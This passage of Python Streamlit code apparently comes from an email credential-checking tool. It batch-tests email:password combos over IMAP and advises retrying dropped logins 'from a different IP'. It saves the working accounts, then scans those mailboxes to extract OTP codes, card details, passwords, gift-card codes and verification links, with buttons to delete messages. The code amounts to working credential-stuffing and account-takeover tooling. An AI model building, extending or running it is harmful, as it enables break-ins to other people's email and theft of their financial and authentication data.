        st.success(f"🎉 Check Complete! Started: {meta['started']} | Ended: {meta['ended']} | Duration: {meta['duration']}")

    stats = st.session_state.batch_stats
    # v13.40: five metrics side by side are ~70px each on a phone.
    a_row1 = st.columns(3)
    a_row2 = st.columns(2)
    with a_row1[0]:
        st.metric("✅ Valid", stats.get("valid", 0))
    with a_row1[1]:
        st.metric("❌ Wrong", stats.get("wrong", 0))
    with a_row1[2]:
        st.metric("🔑 AppPass", stats.get("appass", 0))
    with a_row2[0]:
        st.metric("🚪 Dropped", stats.get("login_dropped", 0))
    with a_row2[1]:
        st.metric("⚠️ Failed", stats.get("failed", 0))

    if stats.get("login_dropped"):
        st.warning(
            f"🚪 **{stats['login_dropped']} account(s) hit a LOGIN DROP** — the server answered, "
            f"accepted the LOGIN command and then closed the socket (* BYE). Those passwords are "
            f"still UNTESTED. Retry them from a different IP, or with an app password, before "
            f"discarding them."
        )

    st.markdown("#### Detailed Execution Log Table")
    if st.session_state.batch_results_table:
        st.dataframe(
            st.session_state.batch_results_table,
            column_order=("Time", "Status", "Email:Password", "Under-The-Hood Background Trace"),
            width="stretch",
            hide_index=True
        )
        # v13.40: results were session-only with no export.
        _csv = io.StringIO()
        _w = csv.DictWriter(_csv, fieldnames=["Time", "Status", "Email:Password", "Under-The-Hood Background Trace"])
        _w.writeheader()
        _w.writerows(st.session_state.batch_results_table)
        st.download_button(
            "⬇️ Download This Run (CSV)",
            data=_csv.getvalue(),
            file_name=f"batch_run_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            mime="text/csv",
            width="stretch",
        )
    else:
        st.caption("No table results available yet.")
# @@END 033 STREAM_TABS


# @@BLOCK 034 SIDEBAR_OVERRIDES_LOGIN deps=033
st.sidebar.markdown("---")

st.sidebar.text_input("Email override", key="custom_email")
st.sidebar.text_input("Password override", type="password", key="custom_pass")
st.sidebar.text_input("IMAP host override", key="custom_host")

if st.sidebar.button("🔑 Login & Save Account", type="primary", width="stretch"):
    c_email = st.session_state.custom_email.strip()
    c_pass = st.session_state.custom_pass.strip()
    c_override = st.session_state.custom_host.strip()
    if not c_email or not c_pass:
        st.sidebar.error("Please enter both Email and Password override.")
    else:
        hosts = candidate_hosts(c_email, override_host=c_override)
        success, connected_host, discovered_folders = False, "", ["INBOX"]
        last_err = ""
        test_mail = None

        with st.spinner("Connecting, authenticating & discovering folders..."):
            for host in hosts:
                try:
                    test_mail = open_mail(c_email, c_pass, host)
                    discovered_folders = list_folders(test_mail, email_addr=c_email, host_val=host)
                    connected_host = host
                    success = True
                    break
                except MsVerdict as mv:                    # v13.37: stop hopping
                    last_err = f"{host}: {mv.detail} [{mv.verdict}]"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass
                    break
                except Exception as ex:
                    last_err = f"{host}: {ex}"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass

        if success:
            combo = f"{c_email}:{c_pass}"
            _combo_key = f"{combo}@{connected_host}:{st.session_state.app_config.get('imap_port', 993)}"

            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != _combo_key:
                try:
                    st.session_state.active_mail.logout()
                except Exception:
                    pass

            st.session_state.active_mail = test_mail
            st.session_state.connected_account_combo = _combo_key

            found_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            new_entry_line = f"{combo} | Found: {found_timestamp}\n"

            # v13.40: every login prepended another copy of the same account.
            _keep = []
            if os.path.exists(MANUAL_VALID_FILE):
                with open(MANUAL_VALID_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    for _ln in f:
                        _raw = _ln.strip()
                        if not _raw or _raw.startswith("#"):
                            continue
                        _c = _combo_of(_raw)
                        if _c.lower() == combo.lower():
                            continue
                        _keep.append(_ln if _ln.endswith("\n") else _ln + "\n")

            with open(MANUAL_VALID_FILE, "w", encoding="utf-8") as f:
                f.write(new_entry_line)
                f.writelines(_keep)

            save_last_account(combo)
            st.session_state.forced_account = combo
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = discovered_folders
            # The selectbox with key "selected_account" was already created in
            # block 029 this run, so writing that key here is too late.  Queue
            # it instead and let block 029 consume it BEFORE the widget exists.
            st.session_state["_pending_selected_account"] = combo
            save_session_cache()
            flash(f"Connected: {connected_host} ({len(discovered_folders)} folders)")
            st.rerun()
        else:
            st.sidebar.error(f"❌ Login failed: {last_err}")
# @@END 034 SIDEBAR_OVERRIDES_LOGIN


# @@BLOCK 035 REFRESH_AND_PORTAL deps=034
active_email, active_password = "", ""
if actual_pick != "none" and ":" in actual_pick:
    active_email, active_password = actual_pick.split(":", 1)

# v13.40: 'override' was assigned and never used; show the effective host instead.
if active_email:
    st.caption(f"Effective host: `{resolve_active_host(active_email) or '(none)'}` · port {st.session_state.app_config.get('imap_port', 993)}")

if st.sidebar.button("🔄 Refresh Inbox", type="secondary", width="stretch"):
    if active_email and active_password:
        host = resolve_active_host(active_email)
        try:
            with st.spinner("Refreshing Inbox..."):
                mail_obj = get_active_mail(active_email, active_password, host)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail_obj, active_email, active_password, host, ["INBOX"], mode="FOLDER_ONLY",
                    page_size=15, page_number=1, sort_order="Newest First", log_target="DEBUG"
                )
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                save_session_cache()
                flash("Inbox refreshed successfully.")
                st.rerun()
        except MsVerdict as mv:                            # v13.37
            st.sidebar.error(f"{mv.verdict}: {mv.detail}")
        except Exception as e:
            st.sidebar.error(f"Refresh failed: {e}")

if active_email and active_password:
    st.sidebar.markdown("---")
    st.sidebar.subheader("🌐 Webmail Portal & Credentials")
    portal_url = get_webmail_portal(active_email)
    st.sidebar.markdown(f"[Open Webmail Portal]({portal_url})", unsafe_allow_html=True)
    st.sidebar.text_input("Copy Credentials", value=f"{active_email}:{active_password}")
# @@END 035 REFRESH_AND_PORTAL


# @@BLOCK 036 CONNECT_DISCOVER deps=035
if st.button("Connect & Discover Folders", type="primary", width="stretch"):
    if actual_pick == "none" or not actual_pick or ":" not in actual_pick:
        st.error("Please select a valid account from the dropdown list first.")
    else:
        acc_email, acc_pass = actual_pick.split(":", 1)
        hosts = candidate_hosts(acc_email)
        last, connected_host, folders, success = "no host", "", ["INBOX"], False
        test_mail = None

        with st.spinner(f"Connecting to {acc_email} and discovering folders..."):
            for host in hosts:
                try:
                    test_mail = open_mail(acc_email, acc_pass, host)
                    folders = list_folders(test_mail, email_addr=acc_email, host_val=host)
                    connected_host = host
                    success = True
                    break
                except MsVerdict as mv:                    # v13.37
                    last = f"{host}: {mv.detail} [{mv.verdict}]"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass
                    break
                except Exception as e:
                    last = f"{host}: {e}"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass

        if success:
            combo = f"{acc_email}:{acc_pass}"
            _combo_key = f"{combo}@{connected_host}:{st.session_state.app_config.get('imap_port', 993)}"
            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != _combo_key:
                try:
                    st.session_state.active_mail.logout()
                except Exception:
                    pass

            st.session_state.active_mail = test_mail
            st.session_state.connected_account_combo = _combo_key
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = folders
            save_session_cache()
            log(f"Discovered {len(folders)} folders via {connected_host}")
            flash(f"Connected: {connected_host} ({len(folders)} folders) — path: {_conn_path()}")
            st.rerun()
        else:
            if acc_email.split("@")[-1].lower() in ZERO_ACCESS_PROVIDERS:
                st.error(f"{last} — this provider has no standard IMAP endpoint (needs an app password / bridge).")
            else:
                st.error(last)
# @@END 036 CONNECT_DISCOVER


# @@BLOCK 037 FOLDER_LOGS_AND_CONTROLS deps=036
if st.session_state.folder_debug_logs:
    with st.expander("🛠️ Folder Discovery Diagnostic Traces", expanded=False):
        st.code(diag_text("folder_debug_logs"), language="text")

# The folder selectbox and the page-size slider had NO key, so they reset to the
# first folder and 15 rows on every rerun - let alone a reload. Both are keyed,
# restored, and validated against the live folder list (a restored folder that is
# no longer listed would raise).
_folders_now = st.session_state.get("mb_folders") or ["INBOX"]
if st.session_state.get("folder_sel") not in _folders_now:
    st.session_state["folder_sel"] = _folders_now[0]

_ps_pending = st.session_state.pop("_pending_page_size", None)
if isinstance(_ps_pending, int):
    st.session_state["page_size_sel"] = max(5, min(200, _ps_pending))

if st.session_state.get("sort_order_sel") not in ("Newest First", "Oldest First"):
    st.session_state["sort_order_sel"] = "Newest First"
if not isinstance(st.session_state.get("page_size_sel"), int):
    st.session_state["page_size_sel"] = 15

col1, col2, col3 = st.columns([2, 1, 1])
with col1:
    folder = st.selectbox("Select Mail Folder", _folders_now, key="folder_sel")
with col2:
    page_size = st.slider("Page size", 5, 200, key="page_size_sel")
with col3:
    sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"], key="sort_order_sel")

# The stream pager reads this; keep it in step with the slider.
st.session_state["stream_page_size"] = page_size

# Focus the mail scope (account | folder | mode | page). A change clears the
# previous mail's body edits and restores this one's.
_reader_scope_apply(f"{active_email}|{folder}|FOLDER|{st.session_state.get('current_page', 1)}")

if st.button("📂 Load Folder Messages", type="primary", width="stretch"):
    host = resolve_active_host(active_email)
    if not active_email or not active_password or not host:
        st.error("Please connect and load folders first.")
    else:
        try:
            with st.spinner(f"Loading folder '{folder}'..."):
                mail = get_active_mail(active_email, active_password, host)
                msgs = fetch_messages_paginated(
                    mail, active_email, active_password, host, [folder], mode="FOLDER_ONLY",
                    page_size=page_size, page_number=1, sort_order=sort_order, log_target="DEBUG"
                )
                st.session_state.current_messages = msgs
                st.session_state.current_page = 1
                save_session_cache()
                log(f"Loaded {len(msgs)} messages from folder '{folder}'.")
                flash(f"Loaded {len(msgs)} messages from '{folder}'.")
                st.rerun()
        except Exception as e:
            st.error(str(e))
# @@END 037 FOLDER_LOGS_AND_CONTROLS


# @@BLOCK 038 MAIN_STREAM deps=037
def _reader_reload_page(page_no, folders, mode, page_size, sort_order, log_target,
                        bucket, query="", field="TEXT"):
    """Re-fetch one page for a pager button."""
    host = resolve_active_host(active_email)
    if not active_email or not active_password or not host:
        st.error("Reconnect first - this session lost its mailbox (restored tab, "
                 "dropped socket or redeploy). Use Connect & Discover Folders.")
        return
    try:
        mail = get_active_mail(active_email, active_password, host)
        msgs = fetch_messages_paginated(
            mail, active_email, active_password, host, folders, query, field,
            mode=mode, page_size=page_size, page_number=page_no,
            sort_order=sort_order, log_target=log_target)
    except Exception as exc:
        st.error(str(exc))
        return
    st.session_state[bucket] = msgs
    save_session_cache()
    st.rerun()


# One switch for the whole page. Off = no pixel ever calls home.
if "mv_remote" not in st.session_state:
    st.session_state["mv_remote"] = False
_mv_remote = st.checkbox(
    "Load remote images in HTML view (tracking pixels fire)", key="mv_remote",
    help="Inline cid: images are always shown - they are embedded in the message "
         "itself. This switch is only about images hosted on the sender's server. "
         "While this is ON every message renders as HTML, not text.")

# The global view mode. It was a per-message radio defaulting to Text, so "load
# remote images" changed nothing on screen and every row needed its own click.
# Persisted, and forced to HTML while the remote switch is on.
if st.session_state.get("mv_view") not in ("Text", "HTML"):
    st.session_state["mv_view"] = "HTML" if _mv_remote else "Text"
_mv_view = st.radio("Message view", ["Text", "HTML"], horizontal=True, key="mv_view")
if _mv_remote:
    _mv_view = "HTML"


def _mv_mail():
    """Open mailbox for mailview's on-demand full fetch."""
    return get_active_mail(active_email, active_password,
                           resolve_active_host(active_email))


def _render_body(key: str, msg: dict) -> None:
    """The one body-render path for the stream, the OTP scanner and deep search.

    A stale renderer raises TypeError on view=/ns=; anything else can raise too.
    Either way the row must still show its body, so every failure degrades to the
    plain text_area instead of taking the page down. The second try covers the
    case where the renderer already drew the box before it failed.
    """
    if mailview is not None and hasattr(mailview, "render_auto"):
        try:
            mailview.render_auto(st, msg, key, _mv_mail, allow_remote=_mv_remote,
                                 view=_mv_view, ns=active_email)
            return
        except TypeError as ex:
            st.caption(f"body renderer mismatch ({ex}) - plain text shown")
        except Exception as ex:
            st.caption(f"body render failed ({ex}) - plain text shown")
    try:
        st.text_area("Cleaned Message Body", height=150, key=key)
    except Exception:
        st.caption("(body shown above)")


# Main Message Stream
# THE STREAM DOES NOT FILTER. It is the main stream - everything loaded is shown.
# The bot filter is an opt-in checkbox, default OFF, and a bot scan no longer
# forces it on.
bot_only = st.checkbox(
    "Show only detected bot / OTP / Telegram messages", key="bot_filter_mode",
    help="Off = every loaded message. On = only rows already classified as bot "
         "traffic. Nothing is removed from the mailbox either way.")

if bot_only:
    active_msgs = [m for m in st.session_state.current_messages if m.get("is_bot")]
    st.info("🤖 Stream filtered to detected bot / Telegram / blacklist rows. Untick the box for everything.")
else:
    active_msgs = st.session_state.current_messages

page_size = max(5, min(200, int(st.session_state.get("stream_page_size") or page_size)))
total_msgs = st.session_state.total_matched_count or len(active_msgs)

if bot_only:
    st.caption(f"🤖 {sum(1 for m in active_msgs if m.get('is_bot'))} bot row(s) on this page of "
               f"{len(active_msgs)} loaded. Filtering is per page, so a page can look short.")

if len(active_msgs) > 0 or total_msgs > 0:
    st.markdown("---")

    total_pages = max(1, math.ceil(total_msgs / max(1, page_size)))
    curr_p = max(1, min(int(st.session_state.current_page or 1), total_pages))
    st.session_state.current_page = curr_p

    with st.expander(f"✉️ Main Message Stream — Page {curr_p} of {total_pages} ({total_msgs} Total Matches)", expanded=False):
        st.markdown(f"**Showing Page {curr_p} of {total_pages} (Total Server Matches: {total_msgs})**")
        if not active_msgs:
            st.caption("This page is empty - it failed to fetch, or the bot filter removed every row. Use Next / Previous.")

        _rows = st.session_state.get("stream_page_rows")
        if _rows is not None and _rows != total_msgs:
            st.caption(f"{_rows} of {total_msgs} server matches survived the fetch on this page.")

        for idx, msg in enumerate(active_msgs):
            with st.expander(msg_label(msg, idx), expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
                if msg.get("cards"):
                    st.warning(f"💳 **Detected Debit / Credit Card / Transaction Details:** {', '.join(msg['cards'])}")
                if msg.get("creds"):
                    st.info(f"🔒 **Extracted Login/Credential Passwords:** {', '.join(msg['creds'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                _body_key = f"body_{msg['folder']}_{msg['id']}_{idx}"
                if _body_key not in st.session_state:
                    st.session_state[_body_key] = msg["body"]
                _render_body(_body_key, msg)

                op_col1, op_col2, op_col3, op_col4 = st.columns(4)
                host = resolve_active_host(active_email)
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with op_col1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = get_active_mail(active_email, active_password, host)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                msg["is_read"] = True
                                save_session_cache()
                                flash("Marked as read.")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with op_col2:
                    target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            move_message(m_client, msg["folder"], msg["id"], target_move)
                            drop_msg("current_messages", msg)
                            save_session_cache()
                            flash(f"Moved to {target_move}.")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with op_col3:
                    del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                    if st.button(del_label, key=f"del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            drop_msg("current_messages", msg)
                            save_session_cache()
                            flash("Message deleted.")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with op_col4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg.get("raw", b"").decode("utf-8", errors="ignore"))

        st.markdown("---")
        p_col1, p_col2, p_col3 = st.columns([1, 2, 1])

        with p_col1:
            if st.button("Previous Page", disabled=(curr_p <= 1), width="stretch", key="msg_stream_prev"):
                st.session_state.current_page = curr_p - 1
                _reader_reload_page(st.session_state.current_page, [folder], "FOLDER_ONLY",
                                    page_size, sort_order, "DEBUG", "current_messages")

        with p_col2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {curr_p} of {total_pages}</h4>", unsafe_allow_html=True)

        with p_col3:
            if st.button("Next Page", disabled=(curr_p >= total_pages), width="stretch", key="msg_stream_next"):
                st.session_state.current_page = curr_p + 1
                _reader_reload_page(st.session_state.current_page, [folder], "FOLDER_ONLY",
                                    page_size, sort_order, "DEBUG", "current_messages")
# @@END 038 MAIN_STREAM


# @@BLOCK 039 OTP_SCANNER deps=038
# Standalone OTP / Debit / Sensitive Data Scanner
st.markdown("---")
# A CHECKBOX, not an expander. An expander's open/closed state is widget state
# Streamlit throws away on every rerun, so the panel shut itself the moment you
# touched anything inside it. A checkbox persists (and is written to disk).
hub_otp_open = st.checkbox(
    "🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scanner", key="hub_otp_open")
if hub_otp_open:
    st.markdown("#### Dynamic OTP, Password, Debit & Credit Cards, Gift Cards, Telegram & Credential Scanner Controls")

    # Every widget below is SEEDED and created key-only. A widget given BOTH a
    # default and a session_state value warns on every rerun after the first.
    if "otp_scan_scope" not in st.session_state:
        st.session_state["otp_scan_scope"] = ["INBOX"]
    if "otp_category_select" not in st.session_state:
        st.session_state["otp_category_select"] = ["All Security Categories"]
    if "otp_page_size_slider" not in st.session_state:
        st.session_state["otp_page_size_slider"] = 15
    if "otp_clean_toggle" not in st.session_state:
        st.session_state["otp_clean_toggle"] = True
    if "otp_regex_chk" not in st.session_state:
        st.session_state["otp_regex_chk"] = True
    if "otp_all_folders" not in st.session_state:
        st.session_state["otp_all_folders"] = False
    if "otp_custom_kw" not in st.session_state:
        st.session_state["otp_custom_kw"] = ""
    if "otp_blacklist_kw" not in st.session_state:
        st.session_state["otp_blacklist_kw"] = "Telegram, spam, scam, promo"
    if st.session_state.get("otp_search_field") not in ("TEXT", "SUBJECT", "BODY", "FROM"):
        st.session_state["otp_search_field"] = "TEXT"
    if not isinstance(st.session_state.get("otp_page_size_slider"), int):
        st.session_state["otp_page_size_slider"] = 15

    otp_folder_options = _ui_folder_options()
    # a restored scope can name a folder this account does not have
    _otp_scope_keep = [f for f in (st.session_state.get("otp_scan_scope") or []) if f in otp_folder_options]
    st.session_state["otp_scan_scope"] = _otp_scope_keep or ["INBOX"]

    # "all folders" first, so the key it writes is set before the multiselect
    # exists.
    if st.checkbox("Scan every folder in the mailbox", key="otp_all_folders"):
        st.session_state["otp_scan_scope"] = list(otp_folder_options)

    otp_c1, otp_c2, otp_c3 = st.columns([2, 1, 1])

    with otp_c1:
        otp_scope_choice = st.multiselect("Target Folder Scope", otp_folder_options, key="otp_scan_scope")
    with otp_c2:
        category_options = [
            "All Security Categories", "Debit Card & Credit Card Details", "Bank Debit Alert & Online Debit",
            "Order Tracking & Purchase Confirmation", "OTP Message & Verification", "Telegram Alerts & Blacklist",
            "Password / Reset Code", "Gift Cards", "ID Cards / Credentials", "Application Passwords", "Login Info / Info"
        ]
        _otp_cat_keep = [c for c in (st.session_state.get("otp_category_select") or []) if c in category_options]
        st.session_state["otp_category_select"] = _otp_cat_keep or ["All Security Categories"]
        otp_scan_category = st.multiselect("Target Data Type Dropdown", category_options, key="otp_category_select")
    with otp_c3:
        otp_search_field = st.selectbox("Scan Field", ["TEXT", "SUBJECT", "BODY", "FROM"], key="otp_search_field")

    otp_page_size = st.slider("OTP Scanner Results Page Size", 5, 200, key="otp_page_size_slider")

    t_col1, t_col2 = st.columns(2)
    with t_col1:
        otp_auto_clean_toggle = st.toggle("Auto-Clean HTML & Boilerplate", key="otp_clean_toggle")
    with t_col2:
        otp_deep_regex_chk = st.checkbox("Enable Deep Regex Code, Debit & Credit Card Extraction", key="otp_regex_chk")

    preset_keywords_map = {
        "All Security Categories": "OTP password debit credit card gift payment credential login verification reset order tracking confirmation telegram blacklist banned",
        "Debit Card & Credit Card Details": "debit card credit card cardholder cvv cvc exp expiry cardholder payment",
        "Bank Debit Alert & Online Debit": "bank debit online purchase debited debit alert account debited transaction paid",
        "Order Tracking & Purchase Confirmation": "order tracking tracking number purchase order order confirmation PO tracking",
        "OTP Message & Verification": "OTP verification code verify auth token pin",
        "Telegram Alerts & Blacklist": "telegram tg t.me blacklist blacklisted banned blocked spam",
        "Password / Reset Code": "password reset passwd new password",
        "Gift Cards": "gift card claim code voucher redeem",
        "ID Cards / Credentials": "id card identity credentials account info",
        "Application Passwords": "app password application password token secret",
        "Login Info / Info": "login details signin info account access"
    }

    # no value= here. The key is seeded above, so a reload restores the edit
    # instead of resetting the box to the sample string.
    otp_custom_keyword = st.text_input("Custom Keyword Override (Optional)", key="otp_custom_kw")
    otp_blacklist_input = st.text_input("Blacklist Keywords (comma-separated)", key="otp_blacklist_kw")

    def _otp_keywords():
        """The keyword string the scan uses - one implementation, three callers."""
        if otp_custom_keyword.strip():
            return otp_custom_keyword.strip()
        picked = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
        return " ".join(picked) if picked else "card OTP debit telegram blacklist"

    if st.button("🚀 Execute Dedicated Security Scan", type="primary", width="stretch", key="otp_exec_btn"):
        host = resolve_active_host(active_email)
        if not active_email or not active_password or not host:
            st.error("Please connect and discover folders first.")
        elif not otp_scope_choice:
            st.warning("Please select at least one folder from Target Folder Scope.")
        else:
            try:
                target_scope = otp_scope_choice
                kw_to_use = _otp_keywords()

                with st.spinner(f"Scanning target folders ({len(target_scope)}) for security payload [{kw_to_use}]..."):
                    mail = get_active_mail(active_email, active_password, host)
                    msgs = fetch_messages_paginated(
                        mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field,
                        mode="SEARCH", page_size=otp_page_size, page_number=1, sort_order=sort_order,
                        log_target="OTP"
                    )
                    st.session_state.otp_messages = msgs
                    st.session_state.otp_current_page = 1
                    save_session_cache()
                    otp_log(f"Scan complete. Retrieved {st.session_state.otp_total_matched_count} matching messages.")
                    flash(f"Security scan complete. Found {st.session_state.otp_total_matched_count} message(s).")
                    st.rerun()
            except Exception as e:
                st.error(str(e))

    st.markdown("#### 🔒 Standalone Security & Card Message Stream")
    otp_msgs = [m for m in st.session_state.otp_messages if not should_blacklist_message(m, otp_blacklist_input)]
    otp_total = st.session_state.get("otp_total_matched_count", len(otp_msgs))

    if len(otp_msgs) > 0:
        otp_total_pages = max(1, math.ceil(otp_total / max(1, otp_page_size)))
        otp_curr_p = max(1, min(int(st.session_state.otp_current_page or 1), otp_total_pages))
        st.session_state.otp_current_page = otp_curr_p

        st.markdown(f"**Showing Page {otp_curr_p} of {otp_total_pages} (Total Security Matches: {otp_total})**")

        for idx, msg in enumerate(otp_msgs):
            with st.expander(msg_label(msg, idx), expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes / OTPs:** {', '.join(msg['pins'])}")
                if msg.get("cards"):
                    st.warning(f"💳 **Detected Debit, Credit Card & Purchase Details:** {', '.join(msg['cards'])}")
                if msg.get("creds"):
                    st.info(f"🔒 **Extracted Passwords / Credentials / App Passwords:** {', '.join(msg['creds'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                display_body = msg["body"] if otp_auto_clean_toggle else msg.get("body_raw", msg["body"])
                _ob_key = f"otp_b_{msg['folder']}_{msg['id']}_{idx}"
                if _ob_key not in st.session_state:
                    st.session_state[_ob_key] = display_body
                _render_body(_ob_key, msg)

                o_col1, o_col2, o_col3, o_col4 = st.columns(4)
                host = resolve_active_host(active_email)
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with o_col1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"otp_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = get_active_mail(active_email, active_password, host)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                msg["is_read"] = True
                                save_session_cache()
                                flash("Marked as read.")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with o_col2:
                    otp_mv_target = st.selectbox("Move to", st.session_state.mb_folders, key=f"otp_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"otp_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            move_message(m_client, msg["folder"], msg["id"], otp_mv_target)
                            drop_msg("otp_messages", msg)
                            save_session_cache()
                            flash(f"Moved to {otp_mv_target}.")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col3:
                    if st.button("Delete Message", key=f"otp_del_{msg['folder']}_{msg['id']}_{idx}", type="primary"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            drop_msg("otp_messages", msg)
                            save_session_cache()
                            flash("Message deleted.")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg.get("raw", b"").decode("utf-8", errors="ignore"))

        st.markdown("---")
        op_c1, op_c2, op_c3 = st.columns([1, 2, 1])

        with op_c1:
            if st.button("Previous Page", disabled=(otp_curr_p <= 1), width="stretch", key="otp_prev_pg"):
                st.session_state.otp_current_page = otp_curr_p - 1
                _reader_reload_page(st.session_state.otp_current_page,
                                    otp_scope_choice if otp_scope_choice else [folder],
                                    "SEARCH", otp_page_size, sort_order, "OTP",
                                    "otp_messages", query=_otp_keywords(),
                                    field=otp_search_field)

        with op_c2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {otp_curr_p} of {otp_total_pages}</h4>", unsafe_allow_html=True)

        with op_c3:
            if st.button("Next Page", disabled=(otp_curr_p >= otp_total_pages), width="stretch", key="otp_next_pg"):
                st.session_state.otp_current_page = otp_curr_p + 1
                _reader_reload_page(st.session_state.otp_current_page,
                                    otp_scope_choice if otp_scope_choice else [folder],
                                    "SEARCH", otp_page_size, sort_order, "OTP",
                                    "otp_messages", query=_otp_keywords(),
                                    field=otp_search_field)
    else:
        st.caption("No security messages scanned yet. Select categories or keywords and click 'Execute Dedicated Security Scan'.")

    st.markdown("#### 🛠️ OTP Engine Debugging & Diagnose Log Screen")
    with st.expander("🔐 OTP Scanner IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.otp_diag_logs:
            st.code(diag_text("otp_diag_logs"), language="text")
        else:
            st.caption("OTP scanner traces and raw server logs will appear here during execution.")
# @@END 039 OTP_SCANNER


# @@BLOCK 040 DEEP_SEARCH deps=039
# Deep Keyword Search & Scope Filters
st.markdown("---")
# checkbox, not expander - an expander collapsed on every rerun.
hub_search_open = st.checkbox("🔍 Deep Keyword Search & Scope Filters", key="hub_search_open")
if hub_search_open:
    if "deep_search_scope" not in st.session_state:
        st.session_state["deep_search_scope"] = ["INBOX"]
    if "search_page_size_slider" not in st.session_state:
        st.session_state["search_page_size_slider"] = 15
    if "deep_all_folders" not in st.session_state:
        st.session_state["deep_all_folders"] = True
    if "deep_search_query" not in st.session_state:
        st.session_state["deep_search_query"] = ""
    if "deep_search_blacklist_kw" not in st.session_state:
        st.session_state["deep_search_blacklist_kw"] = "Telegram, spam, scam, promo"
    if st.session_state.get("deep_search_field") not in ("TEXT", "SUBJECT", "BODY", "FROM"):
        st.session_state["deep_search_field"] = "TEXT"
    if not isinstance(st.session_state.get("search_page_size_slider"), int):
        st.session_state["search_page_size_slider"] = 15

    search_scope_options = _ui_folder_options()
    _ds_keep = [f for f in (st.session_state.get("deep_search_scope") or []) if f in search_scope_options]
    st.session_state["deep_search_scope"] = _ds_keep or list(search_scope_options)

    # A search should reach the WHOLE mailbox. The scope defaulted to INBOX only,
    # so "search" quietly meant "search one folder". This box starts ticked and
    # re-asserts every folder; untick it to narrow the scope.
    if st.checkbox("Search every folder in the mailbox", key="deep_all_folders"):
        st.session_state["deep_search_scope"] = list(search_scope_options)

    s_col1, s_col2 = st.columns([1, 1])

    with s_col1:
        search_scope_choice = st.multiselect("Search Scope Option", search_scope_options, key="deep_search_scope")
    with s_col2:
